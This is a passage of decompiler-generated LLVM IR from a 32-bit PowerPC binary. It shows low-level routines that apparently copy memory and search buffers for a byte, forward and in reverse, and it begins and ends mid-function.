  store i32 %v1_100114b0, i32* %ctr.global-to-local, align 4
  %v2_100114b0 = icmp eq i32 %v1_100114b0, 0
  br i1 %v2_100114b0, label %dec_label_pc_100114b4, label %dec_label_pc_100114a0

dec_label_pc_100114b4:                            ; preds = %dec_label_pc_100114a0, %dec_label_pc_10011500, %dec_label_pc_10011484
  %v0_100114b4 = load i32, i32* @r11, align 4
  %v1_100114b4 = urem i32 %v0_100114b4, 8
  store i32 %v1_100114b4, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_100114b4, 4
  br i1 %tmp, label %dec_label_pc_100114cc, label %dec_label_pc_100114c0

dec_label_pc_100114c0:                            ; preds = %dec_label_pc_100114b4
  %v0_100114c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100114c0 = add i32 %v0_100114c0, -4
  %v2_100114c0 = inttoptr i32 %v1_100114c0 to i32*
  %v3_100114c0 = load i32, i32* %v2_100114c0, align 4
  store i32 %v1_100114c0, i32* %r4.global-to-local, align 4
  %v1_100114c4 = add nsw i32 %v1_100114b4, -4
  store i32 %v1_100114c4, i32* %r5.global-to-local, align 4
  %v1_100114c8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100114c8 = add i32 %v1_100114c8, -4
  %v3_100114c8 = inttoptr i32 %v2_100114c8 to i32*
  store i32 %v3_100114c0, i32* %v3_100114c8, align 4
  store i32 %v2_100114c8, i32* %r10.global-to-local, align 4
  %v0_100114cc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100114cc

dec_label_pc_100114cc:                            ; preds = %dec_label_pc_100114b4, %dec_label_pc_100114c0
  %v0_100114d4 = phi i32 [ %v1_100114b4, %dec_label_pc_100114b4 ], [ %v0_100114cc.pre, %dec_label_pc_100114c0 ]
  %v3_100114cc = icmp eq i32 %v0_100114d4, 0
  br i1 %v3_100114cc, label %dec_label_pc_1001150c, label %dec_label_pc_100114d4

dec_label_pc_100114d4:                            ; preds = %dec_label_pc_100114cc
  store i32 %v0_100114d4, i32* %ctr.global-to-local, align 4
  %v2_100114dc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100114d8

dec_label_pc_100114d8:                            ; preds = %dec_label_pc_100114d8, %dec_label_pc_100114d4
  %v2_100114dc = phi i32 [ %v3_100114dc, %dec_label_pc_100114d8 ], [ %v2_100114dc.pre, %dec_label_pc_100114d4 ]
  %v0_100114d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100114d8 = add i32 %v0_100114d8, -1
  %v2_100114d8 = inttoptr i32 %v1_100114d8 to i8*
  %v3_100114d8 = load i8, i8* %v2_100114d8, align 1
  store i32 %v1_100114d8, i32* %r4.global-to-local, align 4
  %v3_100114dc = add i32 %v2_100114dc, -1
  %v4_100114dc = inttoptr i32 %v3_100114dc to i8*
  store i8 %v3_100114d8, i8* %v4_100114dc, align 1
  store i32 %v3_100114dc, i32* %r10.global-to-local, align 4
  %v0_100114e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114e0 = add i32 %v0_100114e0, -1
  store i32 %v1_100114e0, i32* %ctr.global-to-local, align 4
  %v2_100114e0 = icmp eq i32 %v1_100114e0, 0
  br i1 %v2_100114e0, label %dec_label_pc_1001150c, label %dec_label_pc_100114d8

dec_label_pc_100114e8:                            ; preds = %dec_label_pc_10011494
  %v1_100114e8 = sub nsw i32 4, %v1_10011494
  store i32 %v1_100114e8, i32* %ctr.global-to-local, align 4
  %v1_100114f0 = load i32, i32* @r5, align 4
  %v2_100114f0 = sub i32 %v1_100114f0, %v1_100114e8
  store i32 %v2_100114f0, i32* @r11, align 4
  br label %dec_label_pc_100114f4

dec_label_pc_100114f4:                            ; preds = %dec_label_pc_100114f4, %dec_label_pc_100114e8
  %v2_100114f8 = phi i32 [ %v3_100114f8, %dec_label_pc_100114f4 ], [ %v0_10011494, %dec_label_pc_100114e8 ]
  %v0_100114f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100114f4 = add i32 %v0_100114f4, -1
  %v2_100114f4 = inttoptr i32 %v1_100114f4 to i8*
  %v3_100114f4 = load i8, i8* %v2_100114f4, align 1
  store i32 %v1_100114f4, i32* %r4.global-to-local, align 4
  %v3_100114f8 = add i32 %v2_100114f8, -1
  %v4_100114f8 = inttoptr i32 %v3_100114f8 to i8*
  store i8 %v3_100114f4, i8* %v4_100114f8, align 1
  store i32 %v3_100114f8, i32* %r10.global-to-local, align 4
  %v0_100114fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114fc = add i32 %v0_100114fc, -1
  store i32 %v1_100114fc, i32* %ctr.global-to-local, align 4
  %v2_100114fc = icmp eq i32 %v1_100114fc, 0
  br i1 %v2_100114fc, label %dec_label_pc_10011500, label %dec_label_pc_100114f4

dec_label_pc_10011500:                            ; preds = %dec_label_pc_100114f4
  %v0_10011500 = load i32, i32* @r11, align 4
  %v1_10011500 = call i32 @__asm_rlwinm.(i32 %v0_10011500, i32 29, i32 3, i32 31)
  store i32 %v1_10011500, i32* %r9.global-to-local, align 4
  %v4_10011500 = icmp eq i32 %v1_10011500, 0
  br i1 %v4_10011500, label %dec_label_pc_100114b4, label %dec_label_pc_10011500.dec_label_pc_1001149c_crit_edge

dec_label_pc_10011500.dec_label_pc_1001149c_crit_edge: ; preds = %dec_label_pc_10011500
  %v1_100114a8.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001149c

dec_label_pc_1001150c:                            ; preds = %dec_label_pc_100114d8, %dec_label_pc_100114cc
  %v0_1001150c = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1001150c

; uselistorder directives
  uselistorder i32 %v1_10011500, { 1, 2, 0 }
  uselistorder i32 %v1_100114fc, { 1, 0 }
  uselistorder i32 %v3_100114f8, { 1, 2, 0 }
  uselistorder i32 %v1_100114e0, { 1, 0 }
  uselistorder i32 %v3_100114dc, { 1, 2, 0 }
  uselistorder i32 %v1_100114b4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_100114b0, { 1, 0 }
  uselistorder i32 %v2_100114ac, { 1, 2, 0 }
  uselistorder i32 %v1_10011494, { 1, 0 }
  uselistorder i32 %v0_10011494, { 2, 1, 0 }
  uselistorder i32 %v1_10011484, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 5, 2, 7, 3, 6, 8 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 5, 3, 6, 4, 7, 8, 9 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_100114cc, { 1, 0 }
  uselistorder label %dec_label_pc_100114b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011484, { 1, 0 }
}

define i32 @function_10011514(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10011514:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10011518 = urem i32 %arg1, 256
  store i32 %v1_10011518, i32* %r4.global-to-local, align 4
  %v0_100115387 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1001153c13 = icmp eq i32 %arg2, 0
  br i1 %v2_1001153c13, label %dec_label_pc_10011544, label %dec_label_pc_10011540

dec_label_pc_10011524:                            ; preds = %dec_label_pc_10011540
  %v1_10011524 = inttoptr i32 %v0_10011524 to i8*
  %v2_10011524 = load i8, i8* %v1_10011524, align 1
  %v3_10011524 = zext i8 %v2_10011524 to i32
  %v0_10011528 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011528 = add i32 %v0_10011528, -1
  store i32 %v1_10011528, i32* %r5.global-to-local, align 4
  %v1_1001152c = load i32, i32* %r4.global-to-local, align 4
  %v4_1001152c = icmp eq i32 %v3_10011524, %v1_1001152c
  %v0_10011530 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001152c, i32 %v0_10011530)
  %v0_10011534 = load i32, i32* @r3, align 4
  %v1_10011534 = add i32 %v0_10011534, 1
  store i32 %v1_10011534, i32* @r3, align 4
  %v0_1001153c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001153c = add i32 %v0_1001153c, -1
  store i32 %v1_1001153c, i32* %ctr.global-to-local, align 4
  %v2_1001153c = icmp eq i32 %v1_1001153c, 0
  br i1 %v2_1001153c, label %dec_label_pc_10011544.loopexit, label %dec_label_pc_10011540

dec_label_pc_10011540:                            ; preds = %dec_label_pc_10011514, %dec_label_pc_10011524
  %v0_10011524 = phi i32 [ %v1_10011534, %dec_label_pc_10011524 ], [ %v0_100115387, %dec_label_pc_10011514 ]
  %v0_10011540.in.in = phi i32 [ %v1_10011534, %dec_label_pc_10011524 ], [ %v0_100115387, %dec_label_pc_10011514 ]
  %v0_10011540.in = urem i32 %v0_10011540.in.in, 4
  %v0_10011540 = icmp eq i32 %v0_10011540.in, 0
  br i1 %v0_10011540, label %dec_label_pc_10011544.loopexit, label %dec_label_pc_10011524

dec_label_pc_10011544.loopexit:                   ; preds = %dec_label_pc_10011540, %dec_label_pc_10011524
  %v0_1001156c16.ph = phi i32 [ %v1_10011534, %dec_label_pc_10011524 ], [ %v0_10011524, %dec_label_pc_10011540 ]
  %v0_10011544.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10011548.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011544

dec_label_pc_10011544:                            ; preds = %dec_label_pc_10011544.loopexit, %dec_label_pc_10011514
  %v0_10011548 = phi i32 [ %v1_10011518, %dec_label_pc_10011514 ], [ %v0_10011548.pre, %dec_label_pc_10011544.loopexit ]
  %v0_10011544 = phi i32 [ 0, %dec_label_pc_10011514 ], [ %v0_10011544.pre, %dec_label_pc_10011544.loopexit ]
  %v0_1001156c16 = phi i32 [ %v0_100115387, %dec_label_pc_10011514 ], [ %v0_1001156c16.ph, %dec_label_pc_10011544.loopexit ]
  %v1_10011544 = udiv i32 %v0_10011544, 4
  %v1_10011548 = mul i32 %v0_10011548, 256
  %v2_10011550 = or i32 %v1_10011548, %v0_10011548
  %v1_10011558 = mul i32 %v2_10011550, 65536
  %v2_10011560 = or i32 %v1_10011558, %v2_10011550
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10011544, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10011544, 4
  br i1 %tmp, label %dec_label_pc_100115f4, label %dec_label_pc_1001156c

dec_label_pc_1001156c:                            ; preds = %dec_label_pc_10011544, %dec_label_pc_100115f0.backedge
  %v0_100115f0 = phi i32 [ %v1_100115f0, %dec_label_pc_100115f0.backedge ], [ %v1_10011544, %dec_label_pc_10011544 ]
  %v0_10011574 = phi i32 [ %v1_10011574, %dec_label_pc_100115f0.backedge ], [ %v0_10011544, %dec_label_pc_10011544 ]
  %v0_100115ac = phi i32 [ %v1_10011570, %dec_label_pc_100115f0.backedge ], [ %v0_1001156c16, %dec_label_pc_10011544 ]
  %v1_1001156c = inttoptr i32 %v0_100115ac to i32*
  %v2_1001156c = load i32, i32* %v1_1001156c, align 4
  %v1_10011570 = add i32 %v0_100115ac, 4
  store i32 %v1_10011570, i32* @r3, align 4
  %v1_10011574 = add i32 %v0_10011574, -4
  store i32 %v1_10011574, i32* %r5.global-to-local, align 4
  %v2_10011578 = xor i32 %v2_1001156c, %v2_10011560
  %v1_10011580 = add i32 %v2_10011578, 2130640639
  %v2_10011584 = xor i32 %v1_10011580, %v2_10011578
  %v2_1001158c = and i32 %v2_10011584, -2130640640
  %v6_1001158c = icmp eq i32 %v2_1001158c, -2130640640
  br i1 %v6_1001158c, label %dec_label_pc_100115f0.backedge, label %dec_label_pc_10011594

dec_label_pc_100115f0.backedge:                   ; preds = %dec_label_pc_1001156c, %dec_label_pc_100115dc
  %v1_100115f0 = add i32 %v0_100115f0, -1
  store i32 %v1_100115f0, i32* %ctr.global-to-local, align 4
  %v2_100115f0 = icmp eq i32 %v1_100115f0, 0
  br i1 %v2_100115f0, label %dec_label_pc_100115f4, label %dec_label_pc_1001156c

dec_label_pc_10011594:                            ; preds = %dec_label_pc_1001156c
  %v2_10011594 = inttoptr i32 %v0_100115ac to i8*
  %v3_10011594 = load i8, i8* %v2_10011594, align 1
  %v4_10011594 = zext i8 %v3_10011594 to i32
  %v1_10011598 = add i32 %v0_100115ac, 3
  store i32 %v1_10011598, i32* @r8, align 4
  %v1_1001159c = add i32 %v0_100115ac, 1
  %v1_100115a0 = add i32 %v0_100115ac, 2
  %v4_100115a4 = icmp eq i32 %v4_10011594, %v0_10011548
  br i1 %v4_100115a4, label %dec_label_pc_100115ac, label %dec_label_pc_100115b4

dec_label_pc_100115ac:                            ; preds = %dec_label_pc_10011594
  ret i32 %v0_100115ac

dec_label_pc_100115b4:                            ; preds = %dec_label_pc_10011594
  %v2_100115b4 = inttoptr i32 %v1_1001159c to i8*
  %v3_100115b4 = load i8, i8* %v2_100115b4, align 1
  %v4_100115b4 = zext i8 %v3_100115b4 to i32
  %v4_100115b8 = icmp eq i32 %v4_100115b4, %v0_10011548
  br i1 %v4_100115b8, label %dec_label_pc_100115c0, label %dec_label_pc_100115c8

dec_label_pc_100115c0:                            ; preds = %dec_label_pc_100115b4
  ret i32 %v1_1001159c

dec_label_pc_100115c8:                            ; preds = %dec_label_pc_100115b4
  %v2_100115c8 = inttoptr i32 %v1_100115a0 to i8*
  %v3_100115c8 = load i8, i8* %v2_100115c8, align 1
  %v4_100115c8 = zext i8 %v3_100115c8 to i32
  %v4_100115cc = icmp eq i32 %v4_100115c8, %v0_10011548
  br i1 %v4_100115cc, label %dec_label_pc_100115d4, label %dec_label_pc_100115dc

dec_label_pc_100115d4:                            ; preds = %dec_label_pc_100115c8
  ret i32 %v1_100115a0

dec_label_pc_100115dc:                            ; preds = %dec_label_pc_100115c8
  %v2_100115dc = inttoptr i32 %v1_10011598 to i8*
  %v3_100115dc = load i8, i8* %v2_100115dc, align 1
  %v4_100115dc = zext i8 %v3_100115dc to i32
  %v4_100115e0 = icmp eq i32 %v4_100115dc, %v0_10011548
  br i1 %v4_100115e0, label %dec_label_pc_100115e8, label %dec_label_pc_100115f0.backedge

dec_label_pc_100115e8:                            ; preds = %dec_label_pc_100115dc
  ret i32 %v1_10011598

dec_label_pc_100115f4:                            ; preds = %dec_label_pc_100115f0.backedge, %dec_label_pc_10011544
  %v0_1001160026 = phi i32 [ %v0_1001156c16, %dec_label_pc_10011544 ], [ %v1_10011570, %dec_label_pc_100115f0.backedge ]
  %v0_100115f4 = phi i32 [ %v0_10011544, %dec_label_pc_10011544 ], [ %v1_10011574, %dec_label_pc_100115f0.backedge ]
  %v1_100115f4 = add i32 %v0_100115f4, 1
  store i32 %v1_100115f4, i32* %r5.global-to-local, align 4
  store i32 %v0_100115f4, i32* %ctr.global-to-local, align 4
  %v2_100116103 = icmp eq i32 %v0_100115f4, 0
  br i1 %v2_100116103, label %dec_label_pc_10011614, label %dec_label_pc_10011600

dec_label_pc_10011600:                            ; preds = %dec_label_pc_100115f4, %dec_label_pc_10011600.dec_label_pc_10011600_crit_edge
  %v1_10011604 = phi i32 [ %v1_10011604.pre, %dec_label_pc_10011600.dec_label_pc_10011600_crit_edge ], [ %v0_10011548, %dec_label_pc_100115f4 ]
  %v0_10011600 = phi i32 [ %v1_1001160c, %dec_label_pc_10011600.dec_label_pc_10011600_crit_edge ], [ %v0_1001160026, %dec_label_pc_100115f4 ]
  %v1_10011600 = inttoptr i32 %v0_10011600 to i8*
  %v2_10011600 = load i8, i8* %v1_10011600, align 1
  %v3_10011600 = zext i8 %v2_10011600 to i32
  %v4_10011604 = icmp eq i32 %v3_10011600, %v1_10011604
  %v0_10011608 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011604, i32 %v0_10011608)
  %v0_1001160c = load i32, i32* @r3, align 4
  %v1_1001160c = add i32 %v0_1001160c, 1
  store i32 %v1_1001160c, i32* @r3, align 4
  %v0_10011610 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011610 = add i32 %v0_10011610, -1
  store i32 %v1_10011610, i32* %ctr.global-to-local, align 4
  %v2_10011610 = icmp eq i32 %v1_10011610, 0
  br i1 %v2_10011610, label %dec_label_pc_10011614, label %dec_label_pc_10011600.dec_label_pc_10011600_crit_edge

dec_label_pc_10011600.dec_label_pc_10011600_crit_edge: ; preds = %dec_label_pc_10011600
  %v1_10011604.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011600

dec_label_pc_10011614:                            ; preds = %dec_label_pc_10011600, %dec_label_pc_100115f4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10011610, { 1, 0 }
  uselistorder i32 %v1_1001160c, { 1, 0 }
  uselistorder i32 %v0_100115f4, { 1, 2, 0 }
  uselistorder i32 %v1_100115f0, { 2, 1, 0 }
  uselistorder i32 %v1_10011574, { 0, 2, 1 }
  uselistorder i32 %v1_10011570, { 0, 2, 1 }
  uselistorder i32 %v0_100115ac, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_10011550, { 1, 0 }
  uselistorder i32 %v1_10011544, { 1, 0 }
  uselistorder i32 %v0_1001156c16, { 1, 0 }
  uselistorder i32 %v0_10011544, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10011548, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v1_1001153c, { 1, 0 }
  uselistorder i32 %v1_10011534, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100115387, { 2, 0, 1 }
  uselistorder i32 %v1_10011518, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011600, { 1, 0 }
  uselistorder label %dec_label_pc_100115f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1001156c, { 1, 0 }
  uselistorder label %dec_label_pc_10011540, { 1, 0 }
}

define i32 @function_1001161c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1001161c:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268506680, i32* @lr, align 4
  %v0_10011634 = call i32 @function_1000dcb0()
  %v0_1001163c = load i32, i32* @r28, align 4
  %v1_1001163c = load i32, i32* @r29, align 4
  %v2_1001163c = add i32 %v1_1001163c, %v0_1001163c
  ret i32 %v2_1001163c
}

define i32 @function_10011650(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10011650:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10011654 = urem i32 %arg2, 256
  store i32 %v1_10011654, i32* %r4.global-to-local, align 4
  %v2_1001165c = add i32 %arg3, %arg1
  store i32 %v2_1001165c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1001167813 = icmp eq i32 %arg3, 0
  br i1 %v2_1001167813, label %dec_label_pc_10011680, label %dec_label_pc_1001167c

dec_label_pc_10011664:                            ; preds = %dec_label_pc_1001167c
  %v1_10011664 = add i32 %v0_10011664, -1
  %v2_10011664 = inttoptr i32 %v1_10011664 to i8*
  %v3_10011664 = load i8, i8* %v2_10011664, align 1
  %v4_10011664 = zext i8 %v3_10011664 to i32
  store i32 %v1_10011664, i32* %r3.global-to-local, align 4
  %v0_10011668 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011668 = add i32 %v0_10011668, -1
  store i32 %v1_10011668, i32* %r5.global-to-local, align 4
  %v1_1001166c = load i32, i32* %r4.global-to-local, align 4
  %v4_1001166c = icmp eq i32 %v4_10011664, %v1_1001166c
  %v0_10011670 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001166c, i32 %v0_10011670)
  %v0_10011674 = load i32, i32* %r3.global-to-local, align 4
  %v0_10011678 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011678 = add i32 %v0_10011678, -1
  store i32 %v1_10011678, i32* %ctr.global-to-local, align 4
  %v2_10011678 = icmp eq i32 %v1_10011678, 0
  br i1 %v2_10011678, label %dec_label_pc_10011680.loopexit, label %dec_label_pc_1001167c

dec_label_pc_1001167c:                            ; preds = %dec_label_pc_10011650, %dec_label_pc_10011664
  %v0_10011664 = phi i32 [ %v0_10011674, %dec_label_pc_10011664 ], [ %v2_1001165c, %dec_label_pc_10011650 ]
  %v0_1001167c.in.in = phi i32 [ %v0_10011674, %dec_label_pc_10011664 ], [ %v2_1001165c, %dec_label_pc_10011650 ]
  %v0_1001167c.in = urem i32 %v0_1001167c.in.in, 4
  %v0_1001167c = icmp eq i32 %v0_1001167c.in, 0
  br i1 %v0_1001167c, label %dec_label_pc_10011680.loopexit, label %dec_label_pc_10011664

dec_label_pc_10011680.loopexit:                   ; preds = %dec_label_pc_1001167c, %dec_label_pc_10011664
  %v0_100116a816.ph = phi i32 [ %v0_10011674, %dec_label_pc_10011664 ], [ %v0_10011664, %dec_label_pc_1001167c ]
  %v0_10011680.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10011684.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011680

dec_label_pc_10011680:                            ; preds = %dec_label_pc_10011680.loopexit, %dec_label_pc_10011650
  %v0_10011684 = phi i32 [ %v1_10011654, %dec_label_pc_10011650 ], [ %v0_10011684.pre, %dec_label_pc_10011680.loopexit ]
  %v0_10011680 = phi i32 [ 0, %dec_label_pc_10011650 ], [ %v0_10011680.pre, %dec_label_pc_10011680.loopexit ]
  %v0_100116a816 = phi i32 [ %v2_1001165c, %dec_label_pc_10011650 ], [ %v0_100116a816.ph, %dec_label_pc_10011680.loopexit ]
  %v1_10011680 = udiv i32 %v0_10011680, 4
  %v1_10011684 = mul i32 %v0_10011684, 256
  %v2_1001168c = or i32 %v1_10011684, %v0_10011684
  %v1_10011694 = mul i32 %v2_1001168c, 65536
  %v2_1001169c = or i32 %v1_10011694, %v2_1001168c
  store i32 %v2_1001169c, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10011680, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10011680, 4
  br i1 %tmp, label %dec_label_pc_10011720, label %dec_label_pc_100116a8

dec_label_pc_100116a8:                            ; preds = %dec_label_pc_10011680, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge
  %v0_1001171c21 = phi i32 [ %v1_1001171c, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge ], [ %v1_10011680, %dec_label_pc_10011680 ]
  %v0_100116c4 = phi i32 [ %v0_100116c4.pre, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge ], [ -2130640640, %dec_label_pc_10011680 ]
  %v0_100116b0 = phi i32 [ %v0_100116b0.pre, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge ], [ %v2_1001169c, %dec_label_pc_10011680 ]
  %v0_100116ac = phi i32 [ %v0_100116ac.pre, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge ], [ %v0_10011680, %dec_label_pc_10011680 ]
  %v0_100116a8 = phi i32 [ %v0_100116a8.pre, %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge ], [ %v0_100116a816, %dec_label_pc_10011680 ]
  %v1_100116a8 = add i32 %v0_100116a8, -4
  %v2_100116a8 = inttoptr i32 %v1_100116a8 to i32*
  %v3_100116a8 = load i32, i32* %v2_100116a8, align 4
  store i32 %v1_100116a8, i32* %r3.global-to-local, align 4
  %v1_100116ac = add i32 %v0_100116ac, -4
  store i32 %v1_100116ac, i32* %r5.global-to-local, align 4
  %v2_100116b0 = xor i32 %v3_100116a8, %v0_100116b0
  %v1_100116b8 = add i32 %v2_100116b0, 2130640639
  %v2_100116bc = xor i32 %v1_100116b8, %v2_100116b0
  %v1_100116c0 = add i32 %v0_100116a8, -1
  %v2_100116c4 = sub i32 -1, %v2_100116bc
  %v3_100116c4 = and i32 %v0_100116c4, %v2_100116c4
  %v6_100116c4 = icmp eq i32 %v3_100116c4, 0
  br i1 %v6_100116c4, label %dec_label_pc_1001171c.backedge, label %dec_label_pc_100116cc

dec_label_pc_100116cc:                            ; preds = %dec_label_pc_100116a8
  %v2_100116cc = inttoptr i32 %v1_100116c0 to i8*
  %v3_100116cc = load i8, i8* %v2_100116cc, align 1
  %v4_100116cc = zext i8 %v3_100116cc to i32
  %v1_100116d0 = add i32 %v0_100116a8, -2
  %v1_100116d4 = add i32 %v0_100116a8, -3
  %v1_100116d8 = load i32, i32* %r4.global-to-local, align 4
  %v4_100116d8 = icmp eq i32 %v4_100116cc, %v1_100116d8
  br i1 %v4_100116d8, label %dec_label_pc_100116e0, label %dec_label_pc_100116e8

dec_label_pc_100116e0:                            ; preds = %dec_label_pc_100116cc
  store i32 %v1_100116c0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116c0

dec_label_pc_100116e8:                            ; preds = %dec_label_pc_100116cc
  %v2_100116e8 = inttoptr i32 %v1_100116d0 to i8*
  %v3_100116e8 = load i8, i8* %v2_100116e8, align 1
  %v4_100116e8 = zext i8 %v3_100116e8 to i32
  %v4_100116ec = icmp eq i32 %v4_100116e8, %v1_100116d8
  br i1 %v4_100116ec, label %dec_label_pc_100116f4, label %dec_label_pc_100116fc

dec_label_pc_100116f4:                            ; preds = %dec_label_pc_100116e8
  store i32 %v1_100116d0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116d0

dec_label_pc_100116fc:                            ; preds = %dec_label_pc_100116e8
  %v2_100116fc = inttoptr i32 %v1_100116d4 to i8*
  %v3_100116fc = load i8, i8* %v2_100116fc, align 1
  %v4_100116fc = zext i8 %v3_100116fc to i32
  %v4_10011700 = icmp eq i32 %v4_100116fc, %v1_100116d8
  br i1 %v4_10011700, label %dec_label_pc_10011708, label %dec_label_pc_10011710

dec_label_pc_10011708:                            ; preds = %dec_label_pc_100116fc
  store i32 %v1_100116d4, i32* %r3.global-to-local, align 4
  ret i32 %v1_100116d4

dec_label_pc_10011710:                            ; preds = %dec_label_pc_100116fc
  %v1_10011710 = inttoptr i32 %v1_100116a8 to i8*
  %v2_10011710 = load i8, i8* %v1_10011710, align 1
  %v3_10011710 = zext i8 %v2_10011710 to i32
  %v4_10011714 = icmp eq i32 %v3_10011710, %v1_100116d8
  %v0_10011718 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011714, i32 %v0_10011718)
  %v0_1001171c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001171c.backedge

dec_label_pc_1001171c.backedge:                   ; preds = %dec_label_pc_10011710, %dec_label_pc_100116a8
  %v0_1001171c = phi i32 [ %v0_1001171c.pre, %dec_label_pc_10011710 ], [ %v0_1001171c21, %dec_label_pc_100116a8 ]
  %v1_1001171c = add i32 %v0_1001171c, -1
  store i32 %v1_1001171c, i32* %ctr.global-to-local, align 4
  %v2_1001171c = icmp eq i32 %v1_1001171c, 0
  br i1 %v2_1001171c, label %dec_label_pc_1001171c.dec_label_pc_10011720_crit_edge, label %dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge

dec_label_pc_1001171c.backedge.dec_label_pc_100116a8_crit_edge: ; preds = %dec_label_pc_1001171c.backedge
  %v0_100116a8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100116ac.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100116b0.pre = load i32, i32* @r7, align 4
  %v0_100116c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100116a8

dec_label_pc_1001171c.dec_label_pc_10011720_crit_edge: ; preds = %dec_label_pc_1001171c.backedge
  %v0_10011720.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011720

dec_label_pc_10011720:                            ; preds = %dec_label_pc_1001171c.dec_label_pc_10011720_crit_edge, %dec_label_pc_10011680
  %v0_10011720 = phi i32 [ %v0_10011720.pre, %dec_label_pc_1001171c.dec_label_pc_10011720_crit_edge ], [ %v0_10011680, %dec_label_pc_10011680 ]
  %v1_10011720 = add i32 %v0_10011720, 1
  store i32 %v1_10011720, i32* %r5.global-to-local, align 4
  store i32 %v0_10011720, i32* %ctr.global-to-local, align 4
  %v2_100117383 = icmp eq i32 %v0_10011720, 0
  br i1 %v2_100117383, label %dec_label_pc_1001173c, label %dec_label_pc_1001172c

dec_label_pc_1001172c:                            ; preds = %dec_label_pc_10011720, %dec_label_pc_1001172c
  %v0_1001172c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001172c = add i32 %v0_1001172c, -1
  %v2_1001172c = inttoptr i32 %v1_1001172c to i8*
  %v3_1001172c = load i8, i8* %v2_1001172c, align 1
  %v4_1001172c = zext i8 %v3_1001172c to i32
  store i32 %v1_1001172c, i32* %r3.global-to-local, align 4
  %v1_10011730 = load i32, i32* %r4.global-to-local, align 4
